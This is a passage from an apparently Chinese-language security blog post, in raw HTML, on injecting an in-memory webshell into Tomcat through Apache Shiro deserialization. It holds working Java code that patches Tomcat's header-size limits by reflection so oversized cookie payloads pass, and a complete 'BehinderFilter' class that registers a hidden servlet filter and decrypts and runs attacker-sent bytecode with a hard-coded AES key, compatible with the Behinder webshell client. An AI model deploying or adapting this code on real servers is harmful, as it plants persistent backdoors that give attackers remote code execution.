class="comment">//java.lang.Runtime.getRuntime().exec(&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;);</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;e&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span></span><br><span class="line">        <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这里用了一下spring框架，理论上不用也可以，可以利用之前提到的方式获取request对象，但是代码太长了，放到cookie里还是太大。</p>
<p>修改一下Gadgets中的代码，<br><img src="/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636196050555-62a53ba5-7e29-4ded-ba0a-2df609fe6e08.png" alt="image.png"><br>重新编译，获得payload,再放到shiro利用的脚本中，获得cookie。<br>再把注册filter的类编译，获取它的字节码,base64编码后放到c字段中。<br><img src="/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636199412962-59f97b1a-673a-4eda-a69e-7fc23bb49d25.png" alt="image.png"><br>执行命令<br><img src="/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636199563980-533ac2fc-6786-40e2-8cf9-aff12b193efa.png" alt="image.png"></p>
<p><a name="i3bdp"></a></p>
<h2 id="修改size"><a href="#修改size" class="headerlink" title="修改size"></a>修改size</h2><p>参考<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzIwNDA2NDk5OQ==&mid=2651374294&idx=3&sn=82d050ca7268bdb7bcf7ff7ff293d7b3">Tomcat的一种通用回显方法研究</a>,<a target="_blank" rel="noopener" href="http://wjlshare.com/archives/1545">Shiro 550 漏洞学习 (二)：内存马注入及回显</a><br>影响请求头大小限制的是<code>Request</code>的<code>inputBuffer</code>，<code>org.apache.coyote.http11.AbstractHttp11Protocol</code>的<code>maxHeaderSize</code>的大小会影响新创建的<code>inputBuffer</code>。<br>这里看源码实在看不懂这几个的关系，直接动态调试一波。<br>通过@Litch1的思路，获取到<code>requestGroupInfo</code>，一个存储<code>requestInfo</code>的list。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">java.lang.reflect.<span class="type">Method</span> <span class="variable">getHandlerMethod</span> <span class="operator">=</span> org.apache.coyote.AbstractProtocol.class.getDeclaredMethod(<span class="string">&quot;getHandler&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">getHandlerMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">org.apache.catalina.loader.<span class="type">WebappClassLoaderBase</span> <span class="variable">webappClassLoaderBase</span> <span class="operator">=</span>(org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardCtx</span> <span class="operator">=</span> (StandardContext)webappClassLoaderBase.getResources().getContext();</span><br><span class="line">Field appcontextFiled=Class.forName(<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span>).getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">appcontextFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">ApplicationContext applicationContext=(ApplicationContext) appcontextFiled.get(standardCtx);</span><br><span class="line">Field standardServiceField=Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span>).getDeclaredField(<span class="string">&quot;service&quot;</span>);</span><br><span class="line">standardServiceField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">StandardService standardService=(StandardService)standardServiceField.get(applicationContext);</span><br><span class="line">Connector[] connectors=standardService.findConnectors();</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; connectors.length; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">4</span> == connectors[i].getScheme().length()) &#123;</span><br><span class="line">        org.apache.coyote.<span class="type">ProtocolHandler</span> <span class="variable">protocolHandler</span> <span class="operator">=</span> connectors[i].getProtocolHandler();</span><br><span class="line">        <span class="keyword">if</span> (protocolHandler <span class="keyword">instanceof</span> org.apache.coyote.http11.AbstractHttp11Protocol) &#123;</span><br><span class="line">            Class[] classes = org.apache.coyote.AbstractProtocol.class.getDeclaredClasses();</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; classes.length; j++) &#123;</span><br><span class="line">                <span class="comment">// org.apache.coyote.AbstractProtocol$ConnectionHandler</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="number">52</span> == (classes[j].getName().length())) &#123;</span><br><span class="line">                    java.lang.reflect.<span class="type">Field</span> <span class="variable">globalField</span> <span class="operator">=</span> classes[j].getDeclaredField(<span class="string">&quot;global&quot;</span>);</span><br><span class="line">                    java.lang.reflect.<span class="type">Field</span> <span class="variable">processorsField</span> <span class="operator">=</span> org.apache.coyote.RequestGroupInfo.class.getDeclaredField(<span class="string">&quot;processors&quot;</span>);</span><br><span class="line">                    globalField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    processorsField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    org.apache.coyote.<span class="type">RequestGroupInfo</span> <span class="variable">requestGroupInfo</span> <span class="operator">=</span> (org.apache.coyote.RequestGroupInfo) globalField.get(getHandlerMethod.invoke(protocolHandler, <span class="literal">null</span>));</span><br><span class="line">                    java.util.<span class="type">List</span> <span class="variable">list</span> <span class="operator">=</span> (java.util.List) processorsField.get(requestGroupInfo);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            ((org.apache.coyote.http11.AbstractHttp11Protocol) protocolHandler).setMaxHttpHeaderSize(<span class="number">100000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里打个断点调试，第一次请求时，<code>requestGroupInfo</code>的size是1，并且尝试多次后，<code>requestGroupInfo</code>中都是<code>Requestinfo@6329</code>，<code>Request@6341</code>，<code>Http11InputBuffer@6355</code>,虽然下面修改了<code>MaxHeaderSize</code>，但由于<code>inputBuffer</code>复用的原因，<code>headerSize</code>也没有变。<br><img src="/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636286041518-94f554a4-de74-4c04-81f6-8ff23ffb4123.png" alt="image.png"><br><img src="/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636286256338-410c5361-3a16-415d-9675-818792f4d59b.png" alt="image.png"><br>如果在进入到断点后，在程序进入下一步前再发送一次请求。之后每次进入断点时，<code>requestGroupInfo</code>的size变成了2，并且新建了有一个<code>inputBuffer</code>，新<code>inputBuffer</code>的<code>headerSize</code>是修改后的<code>maxHeaderSize</code>，这个时候就没有cookie大小的限制了,所以这种方法还需要结合并发去实现。 <br><img src="/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636299198027-777b36ff-1ebb-4e0d-9c20-32388c3fbdda.png" alt="image.png"><br><img src="/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636286348140-ab464945-6277-43e4-9535-4c5e0502c1a2.png" alt="image.png"><br>但是这块我理解的是，因为只有新建的<code>inputBuffer</code>是没有限制的，并不能保证之后的请求都是通过新建的<code>inputBuffer</code>，比如我后面随便一条带命令的请求，还是由没有修改之前的<code>inputBuffer</code>处理的，如果要找到新建的<code>inputBuffer</code>，可能还需要通过并发的方式，这种方式并不完美。<br><img src="/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636287016994-c6d3574e-d514-4189-9e4a-81f67d4fb3a8.png" alt="image.png"><br><img src="/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636287003534-623ce61a-8856-4877-8d34-13ab0ad7a034.png" alt="image.png"><br>所以考虑在修改<code>maxHeaderSize</code>的情况下，遍历<code>requestGroupInfo</code>，直接修改每条<code>inputBuffer</code>。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">java.lang.reflect.<span class="type">Method</span> <span class="variable">getHandlerMethod</span> <span class="operator">=</span> org.apache.coyote.AbstractProtocol.class.getDeclaredMethod(<span class="string">&quot;getHandler&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">java.lang.reflect.<span class="type">Field</span> <span class="variable">requestField</span> <span class="operator">=</span> org.apache.coyote.RequestInfo.class.getDeclaredField(<span class="string">&quot;req&quot;</span>);</span><br><span class="line">java.lang.reflect.<span class="type">Field</span> <span class="variable">headerSizeField</span> <span class="operator">=</span> org.apache.coyote.http11.Http11InputBuffer.class.getDeclaredField(<span class="string">&quot;headerBufferSize&quot;</span>);</span><br><span class="line">getHandlerMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">requestField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">headerSizeField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">org.apache.catalina.loader.<span class="type">WebappClassLoaderBase</span> <span class="variable">webappClassLoaderBase</span> <span class="operator">=</span>(org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardCtx</span> <span class="operator">=</span> (StandardContext)webappClassLoaderBase.getResources().getContext();</span><br><span class="line">Field appcontextFiled=Class.forName(<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span>).getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">appcontextFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">ApplicationContext applicationContext=(ApplicationContext) appcontextFiled.get(standardCtx);</span><br><span class="line">Field standardServiceField=Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span>).getDeclaredField(<span class="string">&quot;service&quot;</span>);</span><br><span class="line">standardServiceField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">StandardService standardService=(StandardService)standardServiceField.get(applicationContext);</span><br><span class="line">Connector[] connectors=standardService.findConnectors();</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; connectors.length; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">4</span> == connectors[i].getScheme().length()) &#123;</span><br><span class="line">        org.apache.coyote.<span class="type">ProtocolHandler</span> <span class="variable">protocolHandler</span> <span class="operator">=</span> connectors[i].getProtocolHandler();</span><br><span class="line">        <span class="keyword">if</span> (protocolHandler <span class="keyword">instanceof</span> org.apache.coyote.http11.AbstractHttp11Protocol) &#123;</span><br><span class="line">            Class[] classes = org.apache.coyote.AbstractProtocol.class.getDeclaredClasses();</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; classes.length; j++) &#123;</span><br><span class="line">                <span class="comment">// org.apache.coyote.AbstractProtocol$ConnectionHandler</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="number">52</span> == (classes[j].getName().length())) &#123;</span><br><span class="line">                    java.lang.reflect.<span class="type">Field</span> <span class="variable">globalField</span> <span class="operator">=</span> classes[j].getDeclaredField(<span class="string">&quot;global&quot;</span>);</span><br><span class="line">                    java.lang.reflect.<span class="type">Field</span> <span class="variable">processorsField</span> <span class="operator">=</span> org.apache.coyote.RequestGroupInfo.class.getDeclaredField(<span class="string">&quot;processors&quot;</span>);</span><br><span class="line">                    globalField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    processorsField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    org.apache.coyote.<span class="type">RequestGroupInfo</span> <span class="variable">requestGroupInfo</span> <span class="operator">=</span> (org.apache.coyote.RequestGroupInfo) globalField.get(getHandlerMethod.invoke(protocolHandler, <span class="literal">null</span>));</span><br><span class="line">                    java.util.<span class="type">List</span> <span class="variable">list</span> <span class="operator">=</span> (java.util.List) processorsField.get(requestGroupInfo);</span><br><span class="line">                    <span class="keyword">for</span>(<span class="type">int</span> k=<span class="number">0</span>;k&lt;list.size();k++)&#123;</span><br><span class="line">                        Request r=(Request)requestField.get(list.get(k));</span><br><span class="line">                        headerSizeField.set(r.getInputBuffer(),<span class="number">100000</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            ((org.apache.coyote.http11.AbstractHttp11Protocol) protocolHandler).setMaxHttpHeaderSize(<span class="number">100000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>之后所有的<code>inputBuffer</code>都是修改过的size。</p>
<p><a name="vkaVZ"></a></p>
<h1 id="适配冰蝎"><a href="#适配冰蝎" class="headerlink" title="适配冰蝎"></a>适配冰蝎</h1><p>参考冰蝎自带服务端，这里改一下使其适配Filter。<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2744">利用动态二进制加密实现新型一句话木马之Java篇</a></p>
<p>冰蝎自带服务端<br><img src="/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636367401058-f34e4cd8-e861-4b89-a436-6cccbed1512f.png" alt="image.png"><br>冰蝎的原理跟 解决“Request header is too large” 时使用的动态加载字节码的方式很类似。不过这里没有用反射，直接继承了<code>ClassLoader</code>，然后调用父类中的<code>defineClass()</code>方法。<br>而且也没有用那个文章里说的get握手的过程，直接将密码作为AES加密的key。通过<code>pageContext</code>，使恶意类获得<code>request</code>，<code>response</code>，<code>session</code>对象。<br>直接反编译冰蝎的jar包，看一下最新版本的内部是怎么实现的。<br><img src="/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636369139113-9b9a35a1-aefb-4f7c-81c3-90386b5bd28c.png" alt="image.png"><br>每个payload中，都是用<code>fileContext()</code>去处理传入的参数，这里跟一下这个函数。<br><img src="/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636369226989-bfe3fac1-f457-442b-9b2d-6e5671eb98c8.png" alt="image.png"><br>这里可以看出来了，这个版本的冰蝎不只可以用<code>PageContext</code>来传递request对象，也可以用存储了<code>request</code>，<code>response</code>，<code>session</code>的Map来存储。所以把自带服务端的pageContext改成一个存储了request等的Map，传入equals()函数。<br>下面是具体<code>Filter</code>的实现</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.MyClass;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.LifecycleState;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.util.LifecycleBase;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterDef;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.crypto.Cipher;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.SecretKeySpec;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpSession;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.math.BigInteger;</span><br><span class="line"><span class="keyword">import</span> java.security.MessageDigest;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BehinderFilter</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            org.apache.catalina.loader.<span class="type">WebappClassLoaderBase</span> <span class="variable">webappClassLoaderBase</span> <span class="operator">=</span>(org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class="line">            <span class="type">StandardContext</span> <span class="variable">standardCtx</span> <span class="operator">=</span> (StandardContext)webappClassLoaderBase.getResources().getContext();</span><br><span class="line"></span><br><span class="line">            Filter filter=<span class="keyword">new</span> <span class="title class_">BehinderFilter</span>();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(standardCtx.findFilterDef(<span class="string">&quot;yaoa&quot;</span>)==<span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="comment">//添加FilterConfig</span></span><br><span class="line">                <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">                filterDef.setFilter(filter);</span><br><span class="line">                filterDef.setFilterName(<span class="string">&quot;yaoa&quot;</span>);</span><br><span class="line">                filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">                standardCtx.addFilterDef(filterDef);</span><br><span class="line">                standardCtx .filterStart();</span><br><span class="line">                <span class="comment">//添加FilterMap</span></span><br><span class="line">                FilterMap filterMap=<span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">                filterMap.setFilterName(<span class="string">&quot;yaoa&quot;</span>);</span><br><span class="line">                filterMap.addURLPattern(<span class="string">&quot;/yaoyao&quot;</span>);</span><br><span class="line">                filterMap.setDispatcher(String.valueOf(DispatcherType.REQUEST));</span><br><span class="line">                standardCtx.addFilterMap(filterMap);</span><br><span class="line"></span><br><span class="line">                <span class="comment">//获取filterMaps</span></span><br><span class="line">                FilterMap[] filterMaps=standardCtx.findFilterMaps();</span><br><span class="line">                FilterMap[] tmpFilterMaps=<span class="keyword">new</span> <span class="title class_">FilterMap</span>[filterMaps.length];</span><br><span class="line">                <span class="comment">//将恶意Filter移到第一位</span></span><br><span class="line">                <span class="type">int</span> index=<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;filterMaps.length;i++)&#123;</span><br><span class="line">                    <span class="keyword">if</span> (filterMaps[i].getFilterName()==<span class="string">&quot;yaoa&quot;</span>)&#123;</span><br><span class="line">                        tmpFilterMaps[<span class="number">0</span>]=filterMaps[i];</span><br><span class="line">                    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                        tmpFilterMaps[index]=filterMaps[i];</span><br><span class="line">                        index++;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;filterMaps.length;i++)&#123;</span><br><span class="line">                    filterMaps[i]=tmpFilterMaps[i];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">BehinderFilter</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">BehinderFilter</span><span class="params">(ClassLoader c)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(c);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Class <span class="title function_">g</span><span class="params">(<span class="type">byte</span>[] b)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.defineClass(b, <span class="number">0</span>, b.length);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        <span class="type">HttpSession</span> <span class="variable">session</span> <span class="operator">=</span> ((HttpServletRequest)servletRequest).getSession();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        obj.put(<span class="string">&quot;request&quot;</span>, servletRequest);</span><br><span class="line">        obj.put(<span class="string">&quot;response&quot;</span>, servletResponse);</span><br><span class="line">        obj.put(<span class="string">&quot;session&quot;</span>, session);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//密码yaoyao，这里是md5值的前16位。</span></span><br><span class="line">            session.putValue(<span class="string">&quot;u&quot;</span>,<span class="string">&quot;935d07f0ead60299&quot;</span>);</span><br><span class="line">            <span class="type">Cipher</span> <span class="variable">c</span> <span class="operator">=</span> Cipher.getInstance(<span class="string">&quot;AES&quot;</span>);</span><br><span class="line">            c.init(<span class="number">2</span>, <span class="keyword">new</span> <span class="title class_">SecretKeySpec</span>(<span class="string">&quot;935d07f0ead60299&quot;</span>.getBytes(), <span class="string">&quot;AES&quot;</span>));</span><br><span class="line">            (<span class="keyword">new</span> <span class="title class_">BehinderFilter</span>(<span class="built_in">this</span>.getClass().getClassLoader())).g(c.doFinal(<span class="keyword">new</span> <span class="title class_">sun</span>.misc.BASE64Decoder().decodeBuffer(servletRequest.getReader().readLine()))).newInstance().equals(obj);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>编译成字节码-&gt;base64编码<br>利用加载字节码的方式注册FIlter<br><img src="/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636370333295-34e68242-f639-423f-8e63-bd45e454e0b8.png" alt="image.png"><br>冰蝎连接<br><img src="/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636370368281-52ed3250-5184-42ee-b0a2-75706c1d8d7c.png" alt="image.png"><br><img src="/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636370401611-3b3f3e78-dc47-4f71-8bb8-1ed67f99223e.png" alt="image.png"></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">首页</a></li>
        
          <li><a href="/about/">关于</a></li>
        
          <li><a href="/archives/">归档</a></li>
        
          <li><a href="/tags/">标签</a></li>
        
          <li><a target="_blank" rel="noopener" href="http://github.com/yaoyao-cool">项目</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
